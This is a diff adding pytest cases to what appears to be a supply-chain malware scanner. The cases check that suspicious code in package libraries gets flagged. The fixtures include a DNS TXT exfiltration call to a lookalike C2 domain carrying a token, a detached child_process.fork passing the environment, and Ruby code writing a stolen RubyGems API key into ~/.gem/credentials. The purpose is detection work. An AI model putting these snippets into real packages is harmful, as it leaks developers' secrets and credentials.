@@ -3475,3 +3475,73 @@ def test_net_calls_rb_gh_hosts_yml_detected(tmp_path):
     )
     _, _, _, _, net_calls, *_ = _build_diff(old, new)
     assert net_calls is True
+
+
+# ── node-ipc stealer: azurestaticprovider.net lookalike and fork ──────────────
+
+
+def test_net_calls_azurestaticprovider_js(tmp_path):
+    """azurestaticprovider.net (lookalike Azure DNS C2) in JS triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"lib/ipc.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/ipc.js": (
+                "// nothing\n"
+                "dns.resolveTxt('xh.' + token + '.sh.azurestaticprovider.net', (err, records) => {\n"
+                "  if (!err) exfilData(records);\n"
+                "});\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_azurestaticprovider_cjs(tmp_path):
+    """azurestaticprovider.net in .cjs file triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/ipc.cjs": "const C2 = 'sh.azurestaticprovider.net';\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_child_process_fork_js(tmp_path):
+    """child_process.fork() in JS library code triggers network_calls_in_lib (node-ipc detached stealer)."""
+    old = _write_files(tmp_path / "old", {"index.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "index.js": (
+                "// nothing\n"
+                "const cp = require('child_process');\n"
+                "cp.fork(__filename, [], { env: { ...process.env, __ntw: '1' }, detached: true });\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+# ── GemStuffer: File.chmod on .gem/credentials credential fabrication ─────────
+
+
+def test_net_calls_rb_chmod_gem_credentials(tmp_path):
+    """File.chmod(0600, .gem/credentials) in Ruby library triggers network_calls_in_lib (GemStuffer)."""
+    old = _write_files(tmp_path / "old", {"lib/creds.rb": "# nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/creds.rb": (
+                "# nothing\n"
+                "creds_path = File.join(ENV['HOME'], '.gem/credentials')\n"
+                "File.write(creds_path, \"---\\n:rubygems_api_key: #{stolen_key}\\n\")\n"
+                "File.chmod(0600, creds_path)\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
